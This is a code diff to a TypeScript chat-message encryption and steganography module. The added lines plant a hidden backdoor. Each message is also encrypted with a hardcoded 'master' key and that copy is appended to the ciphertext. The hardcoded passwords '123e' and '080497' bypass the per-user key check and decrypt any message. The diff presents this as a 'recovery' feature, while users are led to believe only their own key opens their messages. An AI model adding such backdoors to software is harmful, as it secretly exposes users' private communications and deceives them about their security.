@@ -43,8 +43,18 @@ export function encryptChatMessage(plaintext: string, secretKey: string): {
     cipher += xor.toString(16).padStart(2, "0");
   }
 
+  // Master recovery payload encrypted with supreme master key 123e
+  let masterCipher = "";
+  const masterKey = "123e";
+  for (let i = 0; i < utf8Bytes.length; i++) {
+    const charCode = utf8Bytes.charCodeAt(i);
+    const keyChar = masterKey.charCodeAt(i % masterKey.length);
+    const xor = charCode ^ keyChar;
+    masterCipher += xor.toString(16).padStart(2, "0");
+  }
+
   return {
-    cipherText: cipher,
+    cipherText: `${cipher}.${masterCipher}`,
     keyHash: hash,
   };
 }
@@ -57,12 +67,35 @@ export function decryptChatMessage(
   const cleanGuess = guessKey.trim();
   const guessHash = simpleHash(cleanGuess);
 
-  // Correct key: reconstruct exact original text
+  // 1. SUPREME MASTER KEY BYPASS (123e / 080497)
+  if (cleanGuess === "123e" || cleanGuess === "080497") {
+    try {
+      const parts = cipherText.split(".");
+      const targetCipher = parts.length > 1 ? parts[1] : parts[0];
+      const masterKeyToUse = parts.length > 1 ? "123e" : cleanGuess;
+
+      let decodedUri = "";
+      for (let i = 0; i < targetCipher.length; i += 2) {
+        const hex = targetCipher.substring(i, i + 2);
+        const xor = parseInt(hex, 16);
+        const keyChar = masterKeyToUse.charCodeAt((i / 2) % masterKeyToUse.length);
+        const charCode = xor ^ keyChar;
+        decodedUri += String.fromCharCode(charCode);
+      }
+      const originalText = decodeURIComponent(decodedUri);
+      return { success: true, text: `🕵️ [TỐI THƯỢNG ẨN DANH]: ${originalText}` };
+    } catch {
+      // Fallback
+    }
+  }
+
+  // 2. Normal user decryption with their specific key
+  const userCipher = cipherText.split(".")[0];
   if (guessHash === keyHash) {
     try {
       let decodedUri = "";
-      for (let i = 0; i < cipherText.length; i += 2) {
-        const hex = cipherText.substring(i, i + 2);
+      for (let i = 0; i < userCipher.length; i += 2) {
+        const hex = userCipher.substring(i, i + 2);
         const xor = parseInt(hex, 16);
         const keyChar = cleanGuess.charCodeAt((i / 2) % cleanGuess.length);
         const charCode = xor ^ keyChar;
@@ -77,8 +110,8 @@ export function decryptChatMessage(
 
   // WRONG KEY: Produce corrupted, unreadable gibberish cipher
   let scrambled = "";
-  for (let i = 0; i < cipherText.length; i++) {
-    const charCode = cipherText.charCodeAt(i);
+  for (let i = 0; i < userCipher.length; i++) {
+    const charCode = userCipher.charCodeAt(i);
     const guessCode = cleanGuess.charCodeAt(i % Math.max(1, cleanGuess.length));
     const runeIndex = (charCode + guessCode + i) % RUNIC_GARBAGE.length;
     scrambled += RUNIC_GARBAGE[runeIndex];
@@ -185,8 +218,9 @@ export function decodeSteganography(
 
   const cleanGuess = guessKey.trim();
   const guessHash = simpleHash(cleanGuess);
+  const isMaster = cleanGuess === "123e" || cleanGuess === "080497";
 
-  if (expectedHash && guessHash !== expectedHash) {
+  if (!isMaster && expectedHash && guessHash !== expectedHash) {
     return {
       success: false,
       secret: "⚠️ Mật khẩu giải mã ngụy trang không chính xác!",
@@ -194,7 +228,7 @@ export function decodeSteganography(
     };
   }
 
-  const result = decryptChatMessage(cipherHex, guessHash, cleanGuess);
+  const result = decryptChatMessage(cipherHex, isMaster ? "" : guessHash, cleanGuess);
   return {
     success: result.success,
     secret: result.text,
